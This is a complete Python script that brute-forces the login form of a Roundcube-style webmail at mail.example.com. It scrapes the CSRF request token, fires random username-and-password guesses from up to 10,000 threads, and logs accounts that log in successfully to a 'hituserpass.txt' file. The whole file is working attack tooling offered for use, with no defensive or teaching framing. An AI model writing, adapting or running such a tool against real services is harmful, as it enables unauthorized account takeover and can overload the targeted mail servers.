import random
import string
import requests
import re
import threading
import concurrent.futures
import time

generated_strings = set()
lock = threading.Lock()
file_lock = threading.Lock()
restart_event = threading.Event()

def generate_unique_random_string(length=10):
    characters = string.ascii_lowercase + string.digits
    
    while True:
        random_string = ''.join(random.choice(characters) for _ in range(length))
        with lock:
            if random_string not in generated_strings:
                generated_strings.add(random_string)
                with file_lock:
                    with open("use.txt", "a") as f:
                        f.write(random_string + "\n")
                return random_string

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
}

def parse_token(text):
    pattern = r'request_token":"(.*?)"'
    match = re.search(pattern, text)
    return match.group(1) if match else None

def brute(username, password):
    try:
        if restart_event.is_set():
            return
        
        url = "http://mail.example.com/"
        session = requests.Session()
        r = session.get(url, headers=headers)
        token = parse_token(r.text)
        if not token:
            # print("Failed to retrieve token")
            return
        
        data = {
            "_token": token, 
            "_task": "login", 
            "_action": "login", 
            "_timezone": "Europe/Moscow",
            "_url": "", 
            "_user": username, 
            "_pass": password
        }
        
        r = session.post(url + '?_task=login', data=data, headers=headers, allow_redirects=False, timeout=5)
        
        if r.status_code == 302:
            with file_lock:
                with open('hituserpass.txt', 'a', encoding='utf-8') as hituserpass_file:
                    hituserpass_file.write(f"{username}:{password}\n")
            print(f"Hit => {username}:{password}")
        else:
            print(f"Fail => {username}:{password}")
    except requests.RequestException as ex:
        print(f"Request error: {ex}")
        restart_event.set()
        time.sleep(15)  # หยุดโปรแกรมเป็นเวลา 5 วินาที
        restart_event.clear()
    except Exception as ex:
        print(f"Unexpected error: {ex}")

def worker():
    while True:
        data = generate_unique_random_string()
        username = data + "@example.com"
        password = data
        brute(username, password)

def main():
    num_threads = 10000  # Adjust the number of threads according to your system's capabilities
    with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
        futures = [executor.submit(worker) for _ in range(num_threads)]
        concurrent.futures.wait(futures)

if __name__ == "__main__":
    main()
